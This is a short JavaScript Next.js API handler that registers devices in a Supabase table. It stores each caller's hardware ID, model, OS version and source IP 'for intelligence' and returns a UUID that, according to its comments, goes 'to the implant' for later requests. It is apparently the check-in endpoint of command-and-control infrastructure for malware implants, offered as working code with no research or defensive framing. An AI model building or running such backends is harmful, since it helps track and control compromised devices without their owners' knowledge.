import { createClient } from '@supabase/supabase-js';

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY);

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method Not Allowed' });
    }

    const { device_id, device_model, os_version } = req.body;

    if (!device_id) {
        return res.status(400).json({ error: 'device_id is required' });
    }

    // Capture the source IP for intelligence
    const ip_address = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

    const { data, error } = await supabase
        .from('devices')
        .upsert({
            device_id,
            device_model,
            os_version,
            ip_address,
            last_seen: new Date().toISOString()
        }, {
            onConflict: 'device_id' // Use the unique hardware ID for conflict resolution
        })
        .select('id') // Select the internal UUID
        .single();

    if (error) {
        console.error('Registration Error:', error.message);
        return res.status(500).json({ error: 'Failed to register device' });
    }

    // Return the internal database UUID to the implant for subsequent requests
    res.status(200).json({ status: 'registered', device_uuid: data.id });
}